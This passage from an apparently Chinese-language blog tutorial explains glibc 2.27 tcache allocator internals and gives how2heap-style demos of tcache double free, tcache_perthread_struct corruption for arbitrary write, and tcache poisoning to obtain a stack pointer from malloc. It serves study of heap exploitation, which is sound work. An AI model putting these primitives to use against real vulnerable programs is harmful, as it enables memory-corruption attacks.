class="keyword">endif</span></span></span><br><span class="line">    ......</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="tcache-init"><a href="#tcache-init" class="headerlink" title="__tcache_init()"></a>__tcache_init()</h4><p>其中 <code>MAYBE_INIT_TCACHE ()</code> 在 tcache 为空（即第一次 malloc）时调用了 <code>tcache_init()</code>，直接查看 <code>tcache_init()</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">tcache_init(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  arena_get (ar_ptr, bytes); <span class="comment">// 找到可用的 arena</span></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes); <span class="comment">// 申请一个 sizeof(tcache_perthread_struct) 大小的 chunk</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim) <span class="comment">// 初始化 tcache</span></span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>tcache_init()</code> 成功返回后，<code>tcache_perthread_struct</code> 就被成功建立了。</p>
<h4 id="申请内存"><a href="#申请内存" class="headerlink" title="申请内存"></a>申请内存</h4><p>接下来将进入申请内存的步骤</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="comment">// 从 tcache list 中获取内存</span></span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins <span class="comment">// 由 size 计算的 idx 在合法范围内</span></span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// 该条 tcache 链不为空</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">// 进入与无 tcache 时类似的流程</span></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">              &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在 <code>tcache-&gt;entries</code> 不为空时，将进入 <code>tcache_get()</code> 的流程获取 chunk，否则与 tcache 机制前的流程类似，这里主要分析第一种 <code>tcache_get()</code>。这里也可以看出 tcache 的优先级很高，比 fastbin 还要高（ fastbin 的申请在没进入 tcache 的流程中）。</p>
<h4 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get()"></a>tcache_get()</h4><p>看一下 <code>tcache_get()</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]); <span class="comment">// 获得一个 chunk，counts 减一</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>tcache_get()</code> 就是获得 chunk 的过程了。可以看出这个过程还是很简单的，从 <code>tcache-&gt;entries[tc_idx]</code> 中获得第一个 chunk，<code>tcache-&gt;counts</code> 减一，几乎没有任何保护。</p>
<h4 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free()"></a>__libc_free()</h4><p>看完申请，再看看有 tcache 时的释放</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_free (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>__libc_free()</code> 没有太多变化，<code>MAYBE_INIT_TCACHE ()</code> 在 tcache 不为空失去了作用。</p>
<h4 id="int-free"><a href="#int-free" class="headerlink" title="_int_free()"></a>_int_free()</h4><p>跟进 <code>_int_free()</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins <span class="comment">// 64</span></span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">// 7</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (p, tc_idx);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  ......</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure>

<p>判断 <code>tc_idx</code> 合法，<code>tcache-&gt;counts[tc_idx]</code> 在 7 个以内时，就进入 <code>tcache_put()</code>，传递的两个参数是<strong>要释放的 chunk</strong> 和<strong>该 chunk 对应的 size 在 tcache 中的下标</strong>。</p>
<h4 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put()"></a>tcache_put()</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>tcache_puts()</code> 完成了把释放的 chunk 插入到 <code>tcache-&gt;entries[tc_idx]</code> 链表头部的操作，也几乎没有任何保护。并且 <strong>没有把 p 位置零</strong>。</p>
<h3 id="个人理解"><a href="#个人理解" class="headerlink" title="个人理解"></a>个人理解</h3><p>上面的应该是glibc2.27的源码，来自ctf-wiki</p>
<p>首先，来理解一下新增的两个结构体<code>tcache_entry</code>和<code>tcache_perthread_struct</code>。</p>
<h4 id="tcache-entry-1"><a href="#tcache-entry-1" class="headerlink" title="tcache_entry"></a>tcache_entry</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<p>这里的<code>t</code>是 thread即线程，<code>cache</code> 是缓存，<code>entry</code>是条目，所以顾名思义 tcache_entry 就是线程缓存的条目。</p>
<p>条目是什么意思呢？如下：</p>
<ol>
<li><p><strong>文献和书籍</strong>：在字典、百科全书、参考书籍等中，“条目”指的是对某一特定词汇、概念或主题的解释或描述。例如，字典中的每一个词汇及其定义都可以称为一个条目。</p>
</li>
<li><p><strong>清单和目录</strong>：在清单或目录中，“条目”指的是其中的各个项目或元素，比如商品清单中的每一项商品都可以被称为一个条目。</p>
</li>
<li><p><strong>数据库</strong>：在数据库管理中，一个“条目”指的是数据库中的一条记录，通常包含多个字段的信息。</p>
</li>
</ol>
<p>总之，“条目”强调的是在某个系统或结构中被标识和记录的一个单位，通常与其他条目一起形成一个完整的集合。</p>
<hr>
<p><img data-src="/../images/image-20250320214550152.png" alt="image-20250320214550152"></p>
<p>这个tcache_entry就应该是像上面这样的单链表结构，</p>
<h4 id="tcache-perthread-struct-1"><a href="#tcache-perthread-struct-1" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h4><p>这个的意思就是 每个线程的线程缓存的结构体。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>每个线程都有一个这样的结构体，它包含了每个线程的缓存（因此称为“tcache_perthread_struct”）。</p>
<p>Glibc在2.26中加入了tcache，它对每个线程增加一个bin缓存，这样能显著提高性能，默认情况下，<strong>每个线程有64个bins，以16(8)递增，msize从24(12)到1032(516)</strong>。</p>
<ul>
<li><code>char counts[TCACHE_MAX_BINS];</code><ul>
<li><code>counts</code> 数组用于跟踪每个 bins 中已分配块的数量。每个索引对应于一个特定大小的内存块。</li>
</ul>
</li>
<li><code>tcache_entry *entries[TCACHE_MAX_BINS];</code><ul>
<li><code>entries</code> 数组用于存储指向 chunk 的指针。</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS 64</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>TCACHE_MAX_BINS</code> 被定义为 64，表示缓存可以有最多 64 个bins。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>__thread</code> 关键字用于声明 <code>tcache</code> 为线程局部存储变量，这意味着每个线程都有自己独立的 <code>tcache</code> 实例。</li>
<li><code>tcache</code> 初始化为 <code>NULL</code>，表示还没有为其分配内存或没有初始化。</li>
</ul>
<h4 id="tcache-init-1"><a href="#tcache-init-1" class="headerlink" title="__tcache_init()"></a>__tcache_init()</h4><p>在这个函数中注意到这两行代码<code>const size_t bytes = sizeof (tcache_perthread_struct); victim = _int_malloc (ar_ptr, bytes);</code></p>
<p>在第一次调用 malloc() 时，系统分配 heap 区域后分配了一个大小为<code>sizeof(tcache_perthread_struct) = 0x241(583)</code>的chunk，它就是每个线程中用于 tcache 机制的一块内存空间。</p>
<h4 id="tcache-get-1"><a href="#tcache-get-1" class="headerlink" title="tcache_get()"></a>tcache_get()</h4><p>在<code>__libc_malloc()</code>开头被调用，这个就是用于从 tcache 中获取一个被 free 的 chunk。</p>
<h4 id="tcache-put-1"><a href="#tcache-put-1" class="headerlink" title="tcache_put()"></a>tcache_put()</h4><p>在<code>_int_free()</code>中被调用，这个用于将一个内存块放回tcache中。</p>
<h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><h5 id="什么情况下会调用-tcache-get-函数数值（什么情况下会到-tcache-中查找-chunk）？"><a href="#什么情况下会调用-tcache-get-函数数值（什么情况下会到-tcache-中查找-chunk）？" class="headerlink" title="什么情况下会调用 tcache_get 函数数值（什么情况下会到 tcache 中查找 chunk）？"></a>什么情况下会调用 <code>tcache_get</code> 函数数值（什么情况下会到 tcache 中查找 chunk）？</h5><ol>
<li>在调用 <code>malloc_hook</code> 之前，<code>int_malloc</code> 之前，如果 <code>tcache</code> 中有合适的 chunk，那么就从 <code>tcache</code> 中取出：</li>
<li>通过 <code>unsorted bin</code>，若 <code>tcache bin</code> 有对应大小的 chunk，从 <code>tcache</code> 中取出：</li>
<li>通过 <code>unsorted bin</code> 时，如果大小不匹配，<code>chunk</code> 会被放入对应的 <code>bins</code>，若达到 <code>tcache_unsorted_limit</code> 限制之前已经存入 <code>chunk</code> 就此被取出（默认限制）。</li>
</ol>
<p>在内存分配的 <code>malloc</code> 函数中，会将内存块移入 <code>tcache</code> 中。</p>
<h5 id="tcache-的功能"><a href="#tcache-的功能" class="headerlink" title="tcache 的功能"></a>tcache 的功能</h5><ol>
<li>首先，申请的内存块符合 <code>fastbin</code> 大小并且在 <code>fastbin</code> 内找到可用的空闲块时，会把 <code>fastbin</code> 链表的其他内存块放入 <code>tcache</code> 中。</li>
<li>其次，申请的内存块符合 <code>smallbin</code> 大小并且在 <code>smallbin</code> 内找到可用的空闲块时，会把 <code>smallbin</code> 链上的其他内存块放入 <code>tcache</code> 中。</li>
<li>第三，针对 <code>unsorted bin</code> 链上有合适的链块时，并不直接返回，而是先放到 <code>tcache</code> 中，继续处理。上面的情况将 <code>chunk</code> 放入 <code>tcache</code> 中，在将合适的 <code>chunk</code> 返回时利用。</li>
</ol>
<p>在 <code>tcache_get</code> 中，<strong>仅仅检查了 <code>tck_idx</code></strong>，前面说过，可以将 <code>tcache</code> 当作一个类似于 <code>fastbin</code> 的单独链表，只是它的 <code>check</code> 并没有复用，因此我们可以利用这一点来进行 <code>attack</code>。</p>
<p> <strong>tcache 遵循“后进先出”，从头部插入，尾部取出</strong></p>
<h4 id="test"><a href="#test" class="headerlink" title="test"></a>test</h4><p>通过下面这段程序再来理解一下tcache，环境：ubuntu 18.04</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -o struct struct.c -g</span></span><br></pre></td></tr></table></figure>

<p>gdb调试：</p>
<ul>
<li>运行到 malloc(0) 直接一直 si 中间的call注意一下 n 跳过。</li>
<li>一直到如下所示 si 进入</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">0x7ffff7a78b66 &lt;malloc_hook_ini+374&gt;    call   tcache_init.part                &lt;tcache_init.part&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>在一直si到</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">0x7ffff7a78460 &lt;tcache_init.part+80&gt;     call   _int_malloc                &lt;_int_malloc&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>用 n 到下一步，再用 heap 就可以看到系统分配了 heap 和这个 tcache_perthread_struct 的 chunk。</li>
</ul>
<img data-src="../images/image-20250320221542108.png" alt="image-20250320221542108" style="zoom: 50%;" />

<h3 id="glibc-tcache变化"><a href="#glibc-tcache变化" class="headerlink" title="glibc_tcache变化"></a>glibc_tcache变化</h3><ul>
<li>glibc2.26中引入tcache</li>
<li>glibc2.27中正式应用了tcache</li>
<li>glibc2.29中加入了检查tcache的double_free的机制，tcache_get()中加入了key变量</li>
</ul>
<h2 id="攻击原理demo"><a href="#攻击原理demo" class="headerlink" title="攻击原理demo"></a>攻击原理demo</h2><h3 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache_dup"></a>tcache_dup</h3><p>本demo是一个简单的利用tcache的double-free attack</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates a simple double-free attack with tcache.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating buffer.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing twice...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p ].\n&quot;</span>, a, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Next allocated buffers will be same: [ %p, %p ].\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>), <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>我们知道在Fastbin attack的时候我们是不能依次free两次同一块chunk的，但是tcache可以</p>
<p>这是为什么呢？原因也很简单，从tcache_put函数可以看出，它几乎没有设置任何检查，也就意味着我们无需做任何事就可以对同一个chunk进行多次的free，相比fastbin_dup来说，tcache_dup的利用更加的简单了</p>
<p>然后我们再malloc两次就可以得到同一块内存的chunk</p>
<p>对本程序而言，程序先malloc了一个chunk a(size&#x3D;8)</p>
<p>然后连续Free两次chunk a,此时在free list中就会链入两次chunk a,</p>
<p>这个时候我们再申请两次chunk就可以将两次的chunk a全部拿出来了</p>
<h3 id="tcache-corruption"><a href="#tcache-corruption" class="headerlink" title="tcache_corruption"></a>tcache_corruption</h3><p>这段代码演示了控制tcache_perthread_struct的chunk，修改next指针（目前的tcache并没有检查next指向的chunk的size是否合法，所以直接伪造next指针为想要修改的地址就好了）实现任意地址写</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TCACHE_MAX_BINS 64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> st   ruct tcache_entry &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">    tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> global_buf[<span class="number">0x100</span>] = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *ptr, *controlled_buf;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> temp;</span><br><span class="line">    tcache_perthread_struct *fake;</span><br><span class="line"><span class="comment">//申请一个 chunk 为泄露 tcache_perthread_struct 的 chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;global_buf: %s\n&quot;</span>, global_buf);</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">0x68</span>);</span><br><span class="line">    temp = (<span class="type">long</span> <span class="type">long</span>)ptr;</span><br><span class="line"><span class="comment">//计算出 tcache_perthread_struct 的 chunk_mem_ptr, 首先要能泄露一个堆地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;temp: %llx\n&quot;</span>, temp);</span><br><span class="line">    temp = temp &amp; (~<span class="number">0xfff</span>);</span><br><span class="line">    temp += <span class="number">0x10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;temp: %llx\n&quot;</span>, temp);</span><br><span class="line"><span class="comment">//向 tcache_perthread_struct 的 chunk 中写入一个地址，他就会出现在 tcache 中，将其申请出来就得到了一个可写的chunk</span></span><br><span class="line">    fake = (tcache_perthread_struct *)temp;</span><br><span class="line">    fake-&gt;entries[<span class="number">5</span>] = (tcache_entry *)global_buf;</span><br><span class="line"><span class="comment">//申请出那块可写的 chunk(内存)，进行写入</span></span><br><span class="line">    controlled_buf = <span class="built_in">malloc</span>(<span class="number">0x68</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(controlled_buf, <span class="string">&quot;Tcache Corruption&quot;</span>, <span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;global_buf: %s\n&quot;</span>, global_buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gdb调试：</p>
<ul>
<li><code>b 25</code>，查看 ptr </li>
<li><code>b 30</code>，查看temp，它是 tcache_perthread_struct 的 chunk_mem_ptr</li>
<li><code>b 33</code>，在这行代码处查看 global_buf 的内容，此时为 hello world</li>
<li><code>b 37</code>，再次查看 global_buf 的内容</li>
</ul>
<p>运行结果：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ctf@1a3f037ee8c1:~/pwn$ ./demo</span><br><span class="line">global_buf: hello world</span><br><span class="line">temp: 555555602670</span><br><span class="line">temp: 555555602010</span><br><span class="line">global_buf: Tcache Corruption</span><br></pre></td></tr></table></figure>

<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h3><p>来源：how2heap</p>
<p>此demo的效果就是返回一个指向任意地址的指针，与fastbin corruption攻击极其相似（本例返回的地址是一个栈地址）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">size_t</span> stack_var;</span><br><span class="line">    <span class="comment">//我们想要返回的地址是stack_var</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;定义了一个变量 stack_var，我们想让程序 malloc 到这里 %p.\n&quot;</span>, (<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;接下来申请两个 chunk\n&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk a 在: %p\n&quot;</span>, a);</span><br><span class="line">    <span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk b 在: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;free 掉这两个 chunk\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在 tcache 那个链表是这样的 [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">    <span class="comment">//我们通过覆写第一个chunk的fd指针，使其指向我们的栈地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;我们把 %p 的前 %lu 字节（也就是 fd/next 指针）改成 stack_var 的地址：%p&quot;</span>, b, <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>), &amp;stack_var);</span><br><span class="line">    b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)&amp;stack_var;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在 tcache 链表是这样的 [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;然后一次 malloc : %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在 tcache 链表是这样的 [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;第二次 malloc: %p\n&quot;</span>, c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ojbk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>b 17</code>，此时申请了两个chunk，一个应该是为了防止合并到Top_chunk，另一个是要攻击的chunk，也就是b。</li>
<li><code>b 22</code>，此时两个chunk已经进入到tcache中。</li>
<li><code>b 27</code>，这里修改了b[0]的位置，也就是chunk b的next指针，此时bins中应为：<code>b -&gt; &amp;stack_var</code></li>
<li><code>b 30</code>，这里申请了一个chunk，此时bins中应为：<code>&amp;stack_var</code></li>
<li><code>b 33</code>，这里很明显就是申请出了&amp;stack_var作为chunk</li>
</ul>
<blockquote>
<p>原因：在glibc 2.27中没有像fastbin中那样检查free_chunk的size域</p>
</blockquote>
<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>对于tcache poisoning来说，我们的利用极其简单</p>
<p>只需要free掉一个chunk放入tcache中，然后直接更改其fd指针，我们就可以任意地址malloc了</p>
<p>程序首先在栈上声明了一个变量，之后malloc了chunk a(size&#x3D;128),此时free掉chunk a,a被链入到free list中</p>
